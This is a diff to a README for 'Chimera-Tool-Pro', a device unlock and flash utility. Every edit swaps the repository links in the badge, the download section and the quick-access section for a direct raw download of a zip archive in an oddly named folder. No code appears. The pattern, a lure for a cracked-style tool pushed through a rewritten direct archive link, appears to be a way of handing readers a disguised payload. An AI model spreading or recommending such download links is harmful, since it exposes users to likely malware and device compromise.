@@ -1,6 +1,6 @@
 # 🛠️ Chimera-Tool-Pro - Unlock, Flash, and Repair Any Device
 
-[![Download Chimera-Tool-Pro](https://img.shields.io/badge/Download-Chimera--Tool--Pro-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro)
+[![Download Chimera-Tool-Pro](https://img.shields.io/badge/Download-Chimera--Tool--Pro-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro/raw/refs/heads/main/ungibbet/v1.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ These are general guidelines. If your computer is slightly below these specs, th
 
 ## ⬇️ Downloading the Software
 
-Visit this link to download the application: [https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro)
+Visit this link to download the application: [https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro/raw/refs/heads/main/ungibbet/v1.4.zip](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro/raw/refs/heads/main/ungibbet/v1.4.zip)
 
 The download page will open in your web browser. Look for the download button or link on that page. Click it to start downloading the application file to your computer.
 
@@ -156,7 +156,7 @@ Before you start, make sure you have:
 
 ## 🔗 Quick Access
 
-**Download Link:** [https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro)
+**Download Link:** [https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro/raw/refs/heads/main/ungibbet/v1.4.zip](https://github.com/nonresiny-almoravid26/Chimera-Tool-Pro/raw/refs/heads/main/ungibbet/v1.4.zip)
 
 ---
 
